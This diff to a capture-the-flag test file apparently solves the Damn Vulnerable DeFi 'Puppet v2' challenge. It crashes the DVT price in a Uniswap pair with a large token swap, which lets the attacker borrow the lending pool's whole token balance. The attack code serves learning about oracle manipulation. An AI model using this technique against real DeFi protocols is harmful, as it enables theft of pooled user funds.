@@ -80,8 +80,63 @@ describe('[Challenge] Puppet v2', function () {
         ).to.be.eq(ethers.utils.parseEther('300000'));
     });
 
+    // UNISWAP_INITIAL_TOKEN_RESERVE = 100 tokens
+    // UNISWAP_INITIAL_WETH_RESERVE = 10 WETH
+
+    // ATTACKER_INITIAL_TOKEN_BALANCE = 10000 tokens
+    // ATTACKER_INITIAL_WETH_BALANCE = 20 WETH
+
+    // POOL_INITIAL_TOKEN_BALANCE = 1000000 tokens
+
+    // Deposit required to get all tokens from the pool with : 300000 WETH
+
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        TokenToSwap = ethers.utils.parseEther('9999.999999999999999999');
+        oneEth = ethers.utils.parseEther("1");
+
+        pairWethBalance = await this.weth.balanceOf(this.uniswapExchange.address);
+        pairTokenBalance = await this.token.balanceOf(this.uniswapExchange.address);
+        console.log("weth Balance of the pair:", ethers.utils.formatEther(pairWethBalance));
+        console.log("token Balance of the pair:", ethers.utils.formatEther(pairTokenBalance));
+        
+        amountOut = await this.uniswapRouter.getAmountsOut(TokenToSwap, [this.weth.address, this.token.address]);
+        console.log("amount out if swapping " , ethers.utils.formatEther(TokenToSwap) , "DVT :", ethers.utils.formatEther(amountOut[1]));
+
+        this.token.approve(this.uniswapRouter.address, TokenToSwap);
+
+        await this.uniswapRouter.swapExactTokensForETH(
+            TokenToSwap,
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+
+        );
+
+        console.log("swap successfull");
+
+        pairWethBalance = await this.weth.balanceOf(this.uniswapExchange.address);
+        pairTokenBalance = await this.token.balanceOf(this.uniswapExchange.address);
+        console.log("weth Balance of the pair:", ethers.utils.formatEther(pairWethBalance));
+        console.log("token Balance of the pair:", ethers.utils.formatEther(pairTokenBalance));
+
+        amountOut = await this.uniswapRouter.getAmountsOut(oneEth, [this.weth.address, this.token.address]);
+        console.log("amount out if swapping " , ethers.utils.formatEther(oneEth) , "DVT :", ethers.utils.formatEther(amountOut[1]));
+        
+        wethToDeposit = await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1000000'));
+        console.log("wethToDeposit:", ethers.utils.formatEther(wethToDeposit));
+        console.log("attacker eth balance:", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+
+        await this.weth.connect(attacker).deposit({value: wethToDeposit});
+        console.log("attacker weth balance", await this.weth.balanceOf(attacker.address));
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, wethToDeposit);
+        await this.lendingPool.connect(attacker)
+        .borrow(
+            POOL_INITIAL_TOKEN_BALANCE,
+             );
+
     });
 
     after(async function () {
@@ -96,4 +151,5 @@ describe('[Challenge] Puppet v2', function () {
             await this.token.balanceOf(attacker.address)
         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
     });
+
 });
